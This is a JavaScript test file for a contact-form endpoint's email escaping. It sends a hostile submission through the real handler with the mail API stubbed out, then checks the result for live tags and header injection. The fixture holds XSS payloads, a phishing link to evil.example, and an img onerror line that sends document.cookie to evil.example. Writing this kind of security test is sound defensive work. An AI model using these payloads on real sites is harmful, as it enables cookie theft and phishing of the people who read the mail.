// Offline acceptance check for The Letter Slot's escaping.
//
// RUN IT:   ./run-escaping-test.sh          (from this folder)
//
// Why this exists rather than a code review. From the kata:
//
//   "This is worth setting up rather than eyeballing, because it is the one
//    check here that a person reading the code reliably passes and the code
//    reliably fails: the escaping is applied to three fields out of four, or
//    to the text copy of the address and not the link copy, and reading
//    cannot see the difference."
//
// Two earlier installs of this pattern (NinjaGym, and the source build it
// came from) shipped with exactly that bug. So: transpile the REAL endpoint,
// stub ONLY the mail library so the composed mail is handed back instead of
// sent, drive a hostile submission through it, and read every tag in the
// result. Nothing about the escaping is reimplemented here, which is the
// entire point.
//
// Needs no secrets and touches no live inbox.

let handler = null;
let sent = null;

globalThis.Deno = {
  serve: (h) => { handler = h; },
  env: { get: (k) => ({
    RESEND_API_KEY: 're_stub_key',
    CONTACT_TO: 'stub-destination@example.com',
    CONTACT_FROM: 'The Letter Slot <stub-sender@example.com>',
  })[k] }
};

const realFetch = globalThis.fetch;
globalThis.fetch = async (url, opts) => {
  if (String(url).includes('api.resend.com')) {
    sent = JSON.parse(opts.body);
    return { ok: true, status: 200, text: async () => 'stubbed' };
  }
  return realFetch(url, opts);
};

await import('./fn.mjs');

const hostile = {
  name: '<img src=x onerror=alert(1)>Mallory',
  // carries a ? and a # so a missing href escape would show up
  email: 'attacker@example.com?subject=Hacked&body=Pwned#anchor',
  subject: '<script>alert(1)</script>',
  message:
    '<a href="https://evil.example">Click here to verify your account</a>\n' +
    '<script>alert("xss")</script>\n' +
    '<span style="display:none">invisible text the owner cannot see</span>\n' +
    '<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">\n' +
    'Ordinary sentence so the message is long enough to skip the nonsense check entirely, which needs 120 characters.',
  website: '',
  elapsedMs: 30000,
  // the source rides in from ?src= on the link, so it is attacker-typed too
  source: '<b onmouseover=alert(1)>linkedin',
};

const res = await handler(new Request('https://x/', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', Origin: 'https://ricktew.com' },
  body: JSON.stringify(hostile),
}));

console.log('visitor sees:', await res.text(), '(status', res.status + ')');
console.log('');
if (!sent) { console.log('FAIL: no mail was composed at all'); process.exit(1); }

const html = sent.html;
const text = sent.text;

// Every tag in the produced mail. Anything not in the allowlist was written
// by the attacker, not by the endpoint.
const MINE = new Set(['table','tr','td','hr','div','/table','/tr','/td','/div']);
const tags = [...html.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9]*)/g)].map(m => m[1].toLowerCase());
const foreign = [...new Set(tags)].filter(t => !MINE.has(t) && !MINE.has('/' + t));

console.log('tags found in the mail :', [...new Set(tags)].join(', '));
console.log('tags I did NOT write   :', foreign.length ? foreign.join(', ') : '(none)');
console.log('');

const checks = [
  ['no foreign tags in the html', foreign.length === 0],
  // Inside a real tag only: the escaped TEXT "&lt;img ... onerror=..." is
  // inert and is exactly what we want to see.
  ['no onerror= inside a live tag', ![...html.matchAll(/<[^>]*>/g)].some(m => /onerror\s*=/i.test(m[0]))],
  ['no <script', !/<script/i.test(html)],
  ['no live href to evil.example', !/href="https:\/\/evil/i.test(html)],
  ['no mailto: link anywhere in the mail', !/mailto:/i.test(html) && !/mailto:/i.test(text)],
  ['name escaped in html', html.includes('&lt;img src=x onerror=alert(1)&gt;Mallory')],
  ['subject carries no markup at all', !/[<>]/.test(sent.subject)],
  ['subject label came from the fixed list', sent.subject.startsWith('AI Ninja Something else:')],
  ['reply_to is the visitor', sent.reply_to === hostile.email],
  ['no newline injected into subject header', !/[\r\n]/.test(sent.subject)],
  ['no newline injected into reply_to header', !/[\r\n]/.test(sent.reply_to)],
  ['destination came from the secret, not the payload', JSON.stringify(sent.to) === '["stub-destination@example.com"]'],
  ['source label came from the fixed list, not the payload', text.includes('Source: Direct, no source on the link') && !html.includes('onmouseover')],
  ['source row is present in the html', /<td[^>]*>Source<\/td>/.test(html)],
];

let bad = 0;
for (const [label, ok] of checks) {
  console.log((ok ? '  PASS  ' : '  FAIL  ') + label);
  if (!ok) bad++;
}
console.log('');
console.log('subject line sent:', JSON.stringify(sent.subject));
console.log('');
console.log(bad === 0 ? 'ALL ESCAPING CHECKS PASSED' : bad + ' CHECK(S) FAILED');
process.exit(bad === 0 ? 0 : 1);
